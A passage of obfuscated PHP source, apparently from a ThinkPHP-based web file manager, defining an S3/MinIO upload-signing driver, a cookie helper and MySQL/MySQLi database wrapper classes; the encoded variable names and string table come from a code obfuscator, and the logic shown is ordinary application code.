$©¦”¯“ = $©¦”¯“ ? $©¦”¯“ : _get($Èò‡å»ë, $›ÏŠ[213], $›ÏŠ[12]); return $©¦”¯“; } public function uploadFormData($®ØÜêá¸, $“Œşê¶ = 3600) { $ŞÛñœ´ =& $_SERVER[…É¦À–]; $¨…Ë¯€È = $this->pathFather($®ØÜêá¸); $ÓßŸîËí = $this->client->getHttpUploadPostParams($this->bucket, $¨…Ë¯€È, $ŞÛñœ´[199], $“Œşê¶); return array_merge((array) $ÓßŸîËí, array($ŞÛñœ´[182] => $this->getHost())); } public function multiUploadFormData($’ÙØ¸Ã·, $´•Çˆ¿ã = 3600) { $Ã¯ò–·ú =& $_SERVER[…É¦À–]; $¿äØÑÀ† = gmdate($Ã¯ò–·ú[222]); $¾ËíÚƒ‚ = array(); $­‰è§…“ = $this->client->getUploadId($this->bucket, $’ÙØ¸Ã·, $¾ËíÚƒ‚); if (!$­‰è§…“) { return !1; } return array($Ã¯ò–·ú[223] => $­‰è§…“, $Ã¯ò–·ú[182] => $this->getHost() . $Ã¯ò–·ú[8] . $this->pathEncode($’ÙØ¸Ã·), $Ã¯ò–·ú[224] => $¿äØÑÀ†, $Ã¯ò–·ú[94] => $’ÙØ¸Ã·); } public function multiUploadAuthData($ÊäÜİ¦ˆ, $Ùá¦ïì‡ = array()) { $îÃ¿ÀÅï =& $_SERVER[…É¦À–]; $Ï›ÅÂà = isset($Ùá¦ïì‡[$îÃ¿ÀÅï[224]]) ? $Ùá¦ïì‡[$îÃ¿ÀÅï[224]] : gmdate($îÃ¿ÀÅï[222]); $‹Ş¦Ô©× = isset($Ùá¦ïì‡[$îÃ¿ÀÅï[174]]) ? $Ùá¦ïì‡[$îÃ¿ÀÅï[174]] : $îÃ¿ÀÅï[12]; $Ãˆ„ú³Ä = $Ùá¦ïì‡[$îÃ¿ÀÅï[94]]; unset($Ùá¦ïì‡[$îÃ¿ÀÅï[94]]); if (isset($Ùá¦ïì‡[$îÃ¿ÀÅï[225]])) { $Ùá¦ïì‡[$îÃ¿ÀÅï[224]] = $Ï›ÅÂà; return $this->listUploadParts($Ãˆ„ú³Ä, $Ùá¦ïì‡); } $áïŒÀÇ = array($îÃ¿ÀÅï[226], $îÃ¿ÀÅï[12], $îÃ¿ÀÅï[120], $îÃ¿ÀÅï[12], "\170\55\x61\155\x7a\x2d\144\141\x74\x65\x3a{$Ï›ÅÂà}", $îÃ¿ÀÅï[8] . $this->bucket . $îÃ¿ÀÅï[8] . $this->pathEncode($Ãˆ„ú³Ä) . $‹Ş¦Ô©×); if (strpos($‹Ş¦Ô©×, $îÃ¿ÀÅï[227]) === 0) { $áïŒÀÇ[0] = $îÃ¿ÀÅï[228]; } if (isset($Ùá¦ïì‡[$îÃ¿ÀÅï[229]]) && $Ùá¦ïì‡[$îÃ¿ÀÅï[229]] == $îÃ¿ÀÅï[230]) { $áïŒÀÇ[0] = $îÃ¿ÀÅï[230]; } $Û§à¬ = implode($îÃ¿ÀÅï[231], $áïŒÀÇ); $ ˆ«ßÁò = base64_encode(hash_hmac($îÃ¿ÀÅï[232], $Û§à¬, $this->secret, !0)); $áÖÑ†Ûí = $îÃ¿ÀÅï[233] . $this->accessKey . $îÃ¿ÀÅï[4] . $ ˆ«ßÁò; if (strpos($‹Ş¦Ô©×, $îÃ¿ÀÅï[227]) === 0) { return array($îÃ¿ÀÅï[234] => $áÖÑ†Ûí, $îÃ¿ÀÅï[224] => $Ï›ÅÂà); } return $áÖÑ†Ûí; } public function listUploadParts($®•¾›¾ë, $¤È’£İ = array()) { $ĞÂ’¶ò =& $_SERVER[…É¦À–]; $–Œ“ÒÛ = str_replace($ĞÂ’¶ò[235], $ĞÂ’¶ò[12], $¤È’£İ[$ĞÂ’¶ò[174]]); $Ù²šéè´ = $this->client->listParts($this->bucket, $®•¾›¾ë, $–Œ“ÒÛ); if (!$Ù²šéè´) { return !1; } unset($¤È’£İ[$ĞÂ’¶ò[225]], $¤È’£İ[$ĞÂ’¶ò[229]]); $¤È’£İ[$ĞÂ’¶ò[94]] = $®•¾›¾ë; $ÍĞ ûôë = $this->multiUploadAuthData($®•¾›¾ë, $¤È’£İ); if (empty($ÍĞ ûôë)) { return !1; } return array($ĞÂ’¶ò[234] => $ÍĞ ûôë, $ĞÂ’¶ò[224] => $¤È’£İ[$ĞÂ’¶ò[224]], $ĞÂ’¶ò[236] => $Ù²šéè´); } public function getHost() { return parent::getHost() . $_SERVER[…É¦À–][8] . $this->bucket; } public function size($’¸×Ò²•) { $†´¤”šî = $this->objectMeta($’¸×Ò²•); return $†´¤”šî ? $†´¤”šî[$_SERVER[…É¦À–][76]] : 0; } public function info($²Á¯Ó®ë) { if ($this->isFolder($²Á¯Ó®ë)) { return $this->folderInfo($²Á¯Ó®ë); } else { if ($this->isFile($²Á¯Ó®ë)) { return $this->fileInfo($²Á¯Ó®ë); } } return !1; } public function exist($µá¬üÏÏ) { return $this->isFile($µá¬üÏÏ) || $this->isFolder($µá¬üÏÏ); } public function isFile($Š¸ĞšÂı) { return !$this->isFolder($Š¸ĞšÂı) && $this->objectMeta($Š¸ĞšÂı); } public function isFolder($¸ÏáÇ”¨) { return $this->cacheMethod($_SERVER[…É¦À–][165], $¸ÏáÇ”¨); } protected function objectMeta($å¿É¤—÷) { return $this->cacheMethod($_SERVER[…É¦À–][167], $å¿É¤—÷); } protected function _objectMeta($¹ë£Ñ—à) { $¯é‘‡ÛŞ =& $_SERVER[…É¦À–]; $¹ë£Ñ—à = rtrim($¹ë£Ñ—à, $¯é‘‡ÛŞ[8]); try { $ıñ›Ì•œ = $this->client->getObjectInfo($this->bucket, $¹ë£Ñ—à); if (!isset($ıñ›Ì•œ[$¯é‘‡ÛŞ[221]]) && isset($ıñ›Ì•œ[$¯é‘‡ÛŞ[237]])) { $ıñ›Ì•œ[$¯é‘‡ÛŞ[221]] = $ıñ›Ì•œ[$¯é‘‡ÛŞ[237]]; } } catch (Exception $êÊ®Ü²¯) { $ıñ›Ì•œ = !1; } if (!$ıñ›Ì•œ) { } return $ıñ›Ì•œ; } protected function _isFolder($Á°ÚÎË—) { $Ì¼ËîÉ =& $_SERVER[…É¦À–]; $Á°ÚÎË— = rtrim($Á°ÚÎË—, $Ì¼ËîÉ[8]); if ($Á°ÚÎË— == $Ì¼ËîÉ[12] || $Á°ÚÎË— == $Ì¼ËîÉ[8]) { return !0; } $¼ÛíéÆ = $this->client->getBucket($this->bucket, $Á°ÚÎË—, null, 1); if (empty($¼ÛíéÆ[$Ì¼ËîÉ[204]])) { return !1; } $³•ïùˆû = $¼ÛíéÆ[$Ì¼ËîÉ[204]][0][$Ì¼ËîÉ[32]]; return stripos($³•ïùˆû, $Á°ÚÎË— . $Ì¼ËîÉ[8]) === 0 ? !0 : !1; if (substr($³•ïùˆû, -1) == $Ì¼ËîÉ[8]) { return !0; } if (get_path_this($³•ïùˆû) == get_path_this($Á°ÚÎË—)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($õ¹ –°ı) { parent::__construct($õ¹ –°ı); $this->signatureVersion($_SERVER[…É¦À–][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($‰Ë¨Í¨Ã, $¼˜ä–—µ = 3600) { $§©Ç³ã =& $_SERVER[…É¦À–]; $‹ÛìÍÀƒ = $§©Ç³ã[199]; $‰×¥©„ = $§©Ç³ã[238]; $Ë¨Ú¤ÀÃ = $§©Ç³ã[62]; $­´€†Õ = gmdate($§©Ç³ã[239]); $Ö‚æ¢Ô… = gmdate($§©Ç³ã[240]); $»¹…®‰¼ = $§©Ç³ã[241]; $£©º´æ = $¼˜ä–—µ . $§©Ç³ã[12]; $ıª•İÒ¦ = $§©Ç³ã[242]; $„Øœ¸÷ = array($this->accessKey, $Ö‚æ¢Ô…, $this->region, $Ë¨Ú¤ÀÃ, $»¹…®‰¼); $‹²ºÁéÏ = implode($§©Ç³ã[8], $„Øœ¸÷); $ª¦á®ÊË = array($§©Ç³ã[243] => gmdate($§©Ç³ã[244], strtotime($§©Ç³ã[245])), $§©Ç³ã[246] => array(array($§©Ç³ã[247] => $this->bucket), array($§©Ç³ã[248] => $‹ÛìÍÀƒ), array($§©Ç³ã[249], $§©Ç³ã[250], $§©Ç³ã[12]), array($§©Ç³ã[249], $§©Ç³ã[251], $§©Ç³ã[12]), array($§©Ç³ã[249], $§©Ç³ã[252], $§©Ç³ã[12]), array($§©Ç³ã[253] => $ıª•İÒ¦), array($§©Ç³ã[254] => $‹²ºÁéÏ), array($§©Ç³ã[255] => $‰×¥©„), array($§©Ç³ã[256] => $­´€†Õ), array($§©Ç³ã[257] => $£©º´æ))); $¬Ãõ±Ê = base64_encode(json_encode($ª¦á®ÊË)); $ıÉíéÔæ = hash_hmac($§©Ç³ã[258], $Ö‚æ¢Ô…, $§©Ç³ã[259] . $this->secret, !0); $˜Ç¨õÖ– = hash_hmac($§©Ç³ã[258], $this->region, $ıÉíéÔæ, !0); $ßù“ëàı = hash_hmac($§©Ç³ã[258], $Ë¨Ú¤ÀÃ, $˜Ç¨õÖ–, !0); $¯Ÿ²¯æ¸ = hash_hmac($§©Ç³ã[258], $»¹…®‰¼, $ßù“ëàı, !0); $¯üÛçùÄ = hash_hmac($§©Ç³ã[258], $¬Ãõ±Ê, $¯Ÿ²¯æ¸); $‡î«†à = array($§©Ç³ã[215] => $§©Ç³ã[12], $§©Ç³ã[260] => $§©Ç³ã[12], $§©Ç³ã[248] => $‹ÛìÍÀƒ, $§©Ç³ã[253] => $ıª•İÒ¦, $§©Ç³ã[261] => $¬Ãõ±Ê, $§©Ç³ã[262] => $‹²ºÁéÏ, $§©Ç³ã[263] => $‰×¥©„, $§©Ç³ã[264] => $­´€†Õ, $§©Ç³ã[265] => $£©º´æ, $§©Ç³ã[266] => $¯üÛçùÄ, $§©Ç³ã[182] => $this->getHost()); return $‡î«†à; } } goto c¦ š …Îé; d‰ÖÁ×·÷¬: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ò©Ô§Çú = '', $ô“œ£í = 0) { if (is_string($Ò©Ô§Çú) && $Ò©Ô§Çú != $_SERVER[…É¦À–][12]) { $this->prefix = $Ò©Ô§Çú; } if (is_numeric($ô“œ£í) && $ô“œ£í > 0) { $this->expire = $ô“œ£í; } } public static function getInstance() { static $ìÁÚ¿™; if ($ìÁÚ¿™ === null) { $ìÁÚ¿™ = new self(); } return $ìÁÚ¿™; } private static $cookieDisable = false; public static function disable($ßÍÑÙÌ‰) { self::$cookieDisable = $ßÍÑÙÌ‰; } private static $sameCookieSet = array(); public static function set($§Àş·®ˆ, $çè‘ÍîÀ, $ÄçğÁ˜á = 0, $…Á’® = false, $Œïşş»± = false) { $­Ÿğøá¹ =& $_SERVER[…É¦À–]; if (self::$cookieDisable) { return; } if (!$ÄçğÁ˜á) { $ÄçğÁ˜á = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$§Àş·®ˆ]) && self::$sameCookieSet[$§Àş·®ˆ] == $çè‘ÍîÀ . $ÄçğÁ˜á) { return; } self::$sameCookieSet[$§Àş·®ˆ] = $çè‘ÍîÀ . $ÄçğÁ˜á; if (!$Œïşş»±) { $Œïşş»± = str_replace(HOST, $­Ÿğøá¹[12], APP_HOST); $Œïşş»± = _get($GLOBALS, $­Ÿğøá¹[927], $Œïşş»±); } $Û¤Ù‡´« = $­Ÿğøá¹[12]; setcookie($§Àş·®ˆ, $çè‘ÍîÀ, time() + $ÄçğÁ˜á, $­Ÿğøá¹[8] . trim($Œïşş»±, $­Ÿğøá¹[8]) . $Û¤Ù‡´«, !1, !1, $…Á’®); } public static function setSafe($™Ø¹ªÃˆ, $©±£ìÖ´, $°œÖç = 0) { self::set($™Ø¹ªÃˆ, $©±£ìÖ´, $°œÖç, !0); } public static function get($š¦”ã–‹) { static $â¢ª—’¤ = false; if (!$â¢ª—’¤) { self::initHeaderCookie(); $â¢ª—’¤ = !0; } return isset($_COOKIE[$š¦”ã–‹]) ? $_COOKIE[$š¦”ã–‹] : !1; } private static function initHeaderCookie() { $ù¢÷Õİ =& $_SERVER[…É¦À–]; if (!isset($_SERVER[$ù¢÷Õİ[928]]) || !$_SERVER[$ù¢÷Õİ[928]]) { return; } $Ú¶­«Ô§ = explode($ù¢÷Õİ[71], $_SERVER[$ù¢÷Õİ[928]]); foreach ($Ú¶­«Ô§ as $´ÕÒ¢æ) { $´ÕÒ¢æ = explode($ù¢÷Õİ[929], $´ÕÒ¢æ); if (count($´ÕÒ¢æ) != 2 || !isset($´ÕÒ¢æ[1])) { continue; } $_COOKIE[trim($´ÕÒ¢æ[0])] = trim($´ÕÒ¢æ[1]); } } public static function remove($‰€ŸíÇ«, $¥”Ç”–Ã = false) { unset($_COOKIE[$‰€ŸíÇ«]); self::set($‰€ŸíÇ«, $_SERVER[…É¦À–][12], 1, $¥”Ç”–Ã); } } class DbMysql extends Db { public function __construct($´±×¥‚ = '') { $±–ìëÑ =& $_SERVER[…É¦À–]; if (!extension_loaded($±–ìëÑ[844])) { think_exception(think_lang($±–ìëÑ[14]) . $±–ìëÑ[930]); } if (!empty($´±×¥‚)) { $this->config = $´±×¥‚; if (empty($this->config[$±–ìëÑ[17]])) { $this->config[$±–ìëÑ[17]] = $±–ìëÑ[12]; } } } public function connect($–íù‘İˆ = '', $¼¸ÅÁ©ú = 0, $šçÇ‡ê = false) { $ˆÂ¾‡…– =& $_SERVER[…É¦À–]; if (!isset($this->linkID[$¼¸ÅÁ©ú])) { if (empty($–íù‘İˆ)) { $–íù‘İˆ = $this->config; } $úÕšéÅÂ = $–íù‘İˆ[$ˆÂ¾‡…–[931]] . ($–íù‘İˆ[$ˆÂ¾‡…–[932]] ? "\x3a{$–íù‘İˆ[$ˆÂ¾‡…–[932]]}" : $ˆÂ¾‡…–[12]); $å™›ÚÔÍ = !empty($–íù‘İˆ[$ˆÂ¾‡…–[17]][$ˆÂ¾‡…–[18]]) ? $–íù‘İˆ[$ˆÂ¾‡…–[17]][$ˆÂ¾‡…–[18]] : $this->pconnect; if ($å™›ÚÔÍ) { $this->linkID[$¼¸ÅÁ©ú] = mysql_pconnect($úÕšéÅÂ, $–íù‘İˆ[$ˆÂ¾‡…–[933]], $–íù‘İˆ[$ˆÂ¾‡…–[934]], 131072); } else { $this->linkID[$¼¸ÅÁ©ú] = mysql_connect($úÕšéÅÂ, $–íù‘İˆ[$ˆÂ¾‡…–[933]], $–íù‘İˆ[$ˆÂ¾‡…–[934]], !0, 131072); } if (!$this->linkID[$¼¸ÅÁ©ú] || !empty($–íù‘İˆ[$ˆÂ¾‡…–[21]]) && !mysql_select_db($–íù‘İˆ[$ˆÂ¾‡…–[21]], $this->linkID[$¼¸ÅÁ©ú])) { think_exception(mysql_error()); } $Àš…ŸãÊ = mysql_get_server_info($this->linkID[$¼¸ÅÁ©ú]); mysql_query($ˆÂ¾‡…–[935] . think_config($ˆÂ¾‡…–[936]) . $ˆÂ¾‡…–[58], $this->linkID[$¼¸ÅÁ©ú]); if ($Àš…ŸãÊ > $ˆÂ¾‡…–[937]) { mysql_query($ˆÂ¾‡…–[938], $this->linkID[$¼¸ÅÁ©ú]); } $this->connected = !0; if (1 != think_config($ˆÂ¾‡…–[22])) { unset($this->config); } } return $this->linkID[$¼¸ÅÁ©ú]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ø¶Ô¢ç¥) { $×´ğÕÍÊ =& $_SERVER[…É¦À–]; if (0 === stripos($ø¶Ô¢ç¥, $×´ğÕÍÊ[293])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ø¶Ô¢ç¥; if ($this->queryID) { $this->free(); } think_action_status($×´ğÕÍÊ[23], 1); think_status($×´ğÕÍÊ[24]); $this->queryID = mysql_query($ø¶Ô¢ç¥, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¡Î‡ÃÅ§) { $Ìƒ„Äûš =& $_SERVER[…É¦À–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¡Î‡ÃÅ§; if ($this->queryID) { $this->free(); } think_action_status($Ìƒ„Äûš[25], 1); think_status($Ìƒ„Äûš[24]); $¯¾ú» = mysql_query($¡Î‡ÃÅ§, $this->_linkID); $this->debug(); if (!1 === $¯¾ú») { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[…É¦À–][939], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $š„§Ûæ» = mysql_query($_SERVER[…É¦À–][940], $this->_linkID); $this->transTimes = 0; if (!$š„§Ûæ») { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $šêÔ¢È» = mysql_query($_SERVER[…É¦À–][941], $this->_linkID); $this->transTimes = 0; if (!$šêÔ¢È») { $this->error(); return !1; } } return !0; } private function getAll() { $êµÆ¬Ë = array(); if ($this->numRows > 0) { while ($Î²îĞ€à = mysql_fetch_assoc($this->queryID)) { $êµÆ¬Ë[] = $Î²îĞ€à; } mysql_data_seek($this->queryID, 0); } return $êµÆ¬Ë; } public function getFields($ÇñÕùöŞ) { $•Õ‘Ù´’ =& $_SERVER[…É¦À–]; $†Øí™Ë“ = $this->query($•Õ‘Ù´’[942] . $this->parseKey($ÇñÕùöŞ)); $Ğ†‰óÌ = array(); if ($†Øí™Ë“) { foreach ($†Øí™Ë“ as $ßÛÍ… => $‹çá¿Š) { $Ğ†‰óÌ[$‹çá¿Š[$•Õ‘Ù´’[31]]] = array($•Õ‘Ù´’[32] => $‹çá¿Š[$•Õ‘Ù´’[31]], $•Õ‘Ù´’[33] => $‹çá¿Š[$•Õ‘Ù´’[34]], $•Õ‘Ù´’[35] => (bool) (strtoupper($‹çá¿Š[$•Õ‘Ù´’[36]]) === $•Õ‘Ù´’[943]), $•Õ‘Ù´’[37] => $‹çá¿Š[$•Õ‘Ù´’[38]], $•Õ‘Ù´’[39] => strtolower($‹çá¿Š[$•Õ‘Ù´’[40]]) == $•Õ‘Ù´’[41], $•Õ‘Ù´’[42] => strtolower($‹çá¿Š[$•Õ‘Ù´’[43]]) == $•Õ‘Ù´’[44]); } } return $Ğ†‰óÌ; } public function getTables($¸Ñ†Óï = '') { $Û›µ›Šş =& $_SERVER[…É¦À–]; if (!empty($¸Ñ†Óï)) { $Ó©›¤² = $Û›µ›Šş[944] . $¸Ñ†Óï . $Û›µ›Šş[945]; } else { $Ó©›¤² = $Û›µ›Šş[946]; } $ëòÄƒæ = $this->query($Ó©›¤²); $ŒÚë—Ã™ = array(); foreach ($ëòÄƒæ as $‡¢îá€  => $¯™íµ¯á) { $ŒÚë—Ã™[$‡¢îá€ ] = current($¯™íµ¯á); } return $ŒÚë—Ã™; } public function replace($©åÂÓ‘¨, $”…ˆ®®Á = array()) { $«¸İ„îö =& $_SERVER[…É¦À–]; foreach ($©åÂÓ‘¨ as $ÊŸ‹¤Î£ => $¹ÀÊ ô) { $¢¤Á¬æ» = $this->parseValue($¹ÀÊ ô); if (is_scalar($¢¤Á¬æ»)) { $Ñïë»«[] = $¢¤Á¬æ»; $Ëòıó¥[] = $this->parseKey($ÊŸ‹¤Î£); } } $ŒŞĞçÒĞ = $«¸İ„îö[947] . $this->parseTable($”…ˆ®®Á[$«¸İ„îö[308]]) . $«¸İ„îö[948] . implode($«¸İ„îö[50], $Ëòıó¥) . $«¸İ„îö[949] . implode($«¸İ„îö[50], $Ñïë»«) . $«¸İ„îö[950]; return $this->execute($ŒŞĞçÒĞ); } public function insertAll($Óò˜â¯Ñ, $ÕÁç«Şï = array(), $´Ï¶ì¬ô = false) { $áÆÊÊ¶¦ =& $_SERVER[…É¦À–]; if (!is_array($Óò˜â¯Ñ[0])) { return !1; } $ûóó®Úö = array_keys($Óò˜â¯Ñ[0]); $ˆ¸İ¸† = array(); foreach ($Óò˜â¯Ñ as $êÅâ“ğó) { $ÕÉ•Ã—¤ = array(); foreach ($êÅâ“ğó as $¯‡Ì®ó¡ => $ó’ßâ¤Ÿ) { $ó’ßâ¤Ÿ = $this->parseValue($ó’ßâ¤Ÿ); if (is_scalar($ó’ßâ¤Ÿ)) { $ÕÉ•Ã—¤[] = $ó’ßâ¤Ÿ; } } $ˆ¸İ¸†[] = $áÆÊÊ¶¦[289] . implode($áÆÊÊ¶¦[50], $ÕÉ•Ã—¤) . $áÆÊÊ¶¦[950]; } array_walk($ûóó®Úö, array($this, $áÆÊÊ¶¦[951])); $Ï¸€Ø‰ª = ($´Ï¶ì¬ô ? $áÆÊÊ¶¦[952] : $áÆÊÊ¶¦[953]) . $áÆÊÊ¶¦[954] . $this->parseTable($ÕÁç«Şï[$áÆÊÊ¶¦[308]]) . $áÆÊÊ¶¦[948] . implode($áÆÊÊ¶¦[50], $ûóó®Úö) . $áÆÊÊ¶¦[955] . implode($áÆÊÊ¶¦[50], $ˆ¸İ¸†); return $this->execute($Ï¸€Ø‰ª); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ô£ä…Áµ =& $_SERVER[…É¦À–]; $this->error = mysql_errno() . $Ô£ä…Áµ[4] . mysql_error($this->_linkID); if ($Ô£ä…Áµ[12] != $this->queryStr) { $this->error .= LNG($Ô£ä…Áµ[48]) . $this->queryStr; } think_trace($this->error, $Ô£ä…Áµ[12], $Ô£ä…Áµ[49]); return $this->error; } public function escapeString($’õØ¨Á·) { if ($this->_linkID) { return mysql_real_escape_string($’õØ¨Á·, $this->_linkID); } else { return mysql_escape_string($’õØ¨Á·); } } public function parseKey(&$¤ëµÖŠæ, $´ÕíĞèÒ = true) { $€äÈ±ç¦ =& $_SERVER[…É¦À–]; if ($´ÕíĞèÒ) { $¤ëµÖŠæ = $this->parseKeyCheck($¤ëµÖŠæ); } if ($¤ëµÖŠæ != $€äÈ±ç¦[189] && !preg_match($€äÈ±ç¦[956], $¤ëµÖŠæ)) { $¤ëµÖŠæ = $€äÈ±ç¦[414] . trim($¤ëµÖŠæ, $€äÈ±ç¦[414]) . $€äÈ±ç¦[414]; } return $¤ëµÖŠæ; } } class DbMysqli extends Db { public function __construct($æ§­ = '') { $«ÊÉŠÉ– =& $_SERVER[…É¦À–]; if (!extension_loaded($«ÊÉŠÉ–[957])) { think_exception(think_lang($«ÊÉŠÉ–[14]) . $«ÊÉŠÉ–[958]); } if (!empty($æ§­)) { $this->config = $æ§­; if (empty($this->config[$«ÊÉŠÉ–[17]])) { $this->config[$«ÊÉŠÉ–[17]] = $«ÊÉŠÉ–[12]; } } } public function connect($³¤áö¿Ø = '', $ëšÜÙ» = 0) { $øµ®“¨Ö =& $_SERVER[…É¦À–]; if (!isset($this->linkID[$ëšÜÙ»])) { if (empty($³¤áö¿Ø)) { $³¤áö¿Ø = $this->config; } $this->linkID[$ëšÜÙ»] = new mysqli($³¤áö¿Ø[$øµ®“¨Ö[931]], $³¤áö¿Ø[$øµ®“¨Ö[933]], $³¤áö¿Ø[$øµ®“¨Ö[934]], $³¤áö¿Ø[$øµ®“¨Ö[21]], $³¤áö¿Ø[$øµ®“¨Ö[932]] ? intval($³¤áö¿Ø[$øµ®“¨Ö[932]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¨—‡æüÅ = $this->linkID[$ëšÜÙ»]->server_version; $this->linkID[$ëšÜÙ»]->query($øµ®“¨Ö[935] . think_config($øµ®“¨Ö[936]) . $øµ®“¨Ö[58]); if ($¨—‡æüÅ > $øµ®“¨Ö[937]) { $this->linkID[$ëšÜÙ»]->query($øµ®“¨Ö[938]); } $this->connected = !0; if (1 != think_config($øµ®“¨Ö[22])) { unset($this->config); } } return $this->linkID[$ëšÜÙ»]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ª“ã÷¤é) { $åŸò½¥Ÿ =& $_SERVER[…É¦À–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ª“ã÷¤é; if ($this->queryID) { $this->free(); } think_action_status($åŸò½¥Ÿ[23], 1); think_status($åŸò½¥Ÿ[24]); $this->queryID = $this->_linkID->query($ª“ã÷¤é); if ($this->_linkID->more_results()) { while (($ÓÂÍ›™Ÿ = $this->_linkID->next_result()) != NULL) { $ÓÂÍ›™Ÿ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¡Î¸‡­) { $ì×¥ôÒá =& $_SERVER[…É¦À–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¡Î¸‡­; if ($this->queryID) { $this->free(); } think_action_status($ì×¥ôÒá[25], 1); think_status($ì×¥ôÒá[24]); $ÄŸ†…ï™ = $this->_linkID->query($¡Î¸‡­); $this->debug(); if (!1 === $ÄŸ†…ï™) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÌÜ‚Ìˆ¿ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÌÜ‚Ìˆ¿) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $´¯ãÔ»§ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$´¯ãÔ»§) { $this->error(); return !1; } } return !0; } private function getAll() { $¯«Ä˜¯œ = array(); if ($this->numRows > 0) { for ($ßËáØƒÊ = 0; $ßËáØƒÊ < $this->numRows; $ßËáØƒÊ++) { $¯«Ä˜¯œ[$ßËáØƒÊ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¯«Ä˜¯œ; } public function getFields($õ¹¿ÂÚò) { $ÒãŒÇ¸Ô =& $_SERVER[…É¦À–]; $Ü©ò±¥ü = $this->query($ÒãŒÇ¸Ô[942] . $this->parseKey($õ¹¿ÂÚò)); $ÑÛ¨âƒï = array(); if ($Ü©ò±¥ü) { foreach ($Ü©ò±¥ü as $¼„¹Ô­¡ => $Øå€¢¸Ğ) { $ÑÛ¨âƒï[$Øå€¢¸Ğ[$ÒãŒÇ¸Ô[31]]] = array($ÒãŒÇ¸Ô[32] => $Øå€¢¸Ğ[$ÒãŒÇ¸Ô[31]], $ÒãŒÇ¸Ô[33] => $Øå€¢¸Ğ[$ÒãŒÇ¸Ô[34]], $ÒãŒÇ¸Ô[35] => (bool) ($Øå€¢¸Ğ[$ÒãŒÇ¸Ô[36]] === $ÒãŒÇ¸Ô[12]), $ÒãŒÇ¸Ô[37] => $Øå€¢¸Ğ[$ÒãŒÇ¸Ô[38]], $ÒãŒÇ¸Ô[39] => strtolower($Øå€¢¸Ğ[$ÒãŒÇ¸Ô[40]]) == $ÒãŒÇ¸Ô[41], $ÒãŒÇ¸Ô[42] => strtolower($Øå€¢¸Ğ[$ÒãŒÇ¸Ô[43]]) == $ÒãŒÇ¸Ô[44]); } } return $ÑÛ¨âƒï; } public function getTables($ñ¶°›‚² = '') { $ŞšÍ²Ö× =& $_SERVER[…É¦À–]; $È“…¡€Ä = !empty($ñ¶°›‚²) ? $ŞšÍ²Ö×[944] . $ñ¶°›‚² . $ŞšÍ²Ö×[945] : $ŞšÍ²Ö×[946]; $³çÑôúÊ = $this->query($È“…¡€Ä); $©öÖÚ® = array(); if ($³çÑôúÊ) { foreach ($³çÑôúÊ as $«ç»Èø => $ÆçÇæô¨) { $©öÖÚ®[$«ç»Èø] = current($ÆçÇæô¨); } } return $©öÖÚ®; } public function replace($ÙİŒ·Ñà, $‘öˆØ€ = array()) { $İÍ—¦ =& $_SERVER[…É¦À–]; foreach ($ÙİŒ·Ñà as $”›’‡œ£ => $Ïƒ¥ãç¾) { $‚‡È‘òå = $this->parseValue($Ïƒ¥ãç¾); if (is_scalar($‚‡È‘òå)) { $—ú™½ã [] = $‚‡È‘òå; $¼ì©¼‰º[] = $this->parseKey($”›’‡œ£); } } $ì¤ùó×ñ = $İÍ—¦[947] . $this->parseTable($‘öˆØ€[$İÍ—¦[308]]) . $İÍ—¦[948] . implode($İÍ—¦[50], $¼ì©¼‰º) . $İÍ—¦[949] . implode($İÍ—¦[50], $—ú™½ã ) . $İÍ—¦[950]; return $this->execute($ì¤ùó×ñ); } public function insertAll($»Ü£‹¡Ÿ, $“ÈÀòöÆ = array(), $Û‘½ïØ† = false) { $²úùß =& $_SERVER[…É¦À–]; if (!is_array($»Ü£‹¡Ÿ[0])) { return !1; } $şšÛ¬˜À = array_keys($»Ü£‹¡Ÿ[0]); $“ÊØ“šì = array(); foreach ($»Ü£‹¡Ÿ as $î£’÷) { $ÔÀ«ô“ = array(); foreach ($î£’÷ as $¶¢”¼Õ => $€ôÉôºœ) { $€ôÉôºœ = $this->parseValue($€ôÉôºœ); if (is_scalar($€ôÉôºœ)) { $ÔÀ«ô“[] = $€ôÉôºœ; } } $“ÊØ“šì[] = $²úùß[289] . implode($²úùß[50], $ÔÀ«ô“) . $²úùß[950]; } array_walk($şšÛ¬˜À, array($this, $²úùß[951])); $â˜ª«ŠÌ = $Û‘½ïØ† ? $²úùß[952] : $²úùß[953]; $ÎšÓâº· = $â˜ª«ŠÌ . $²úùß[954] . 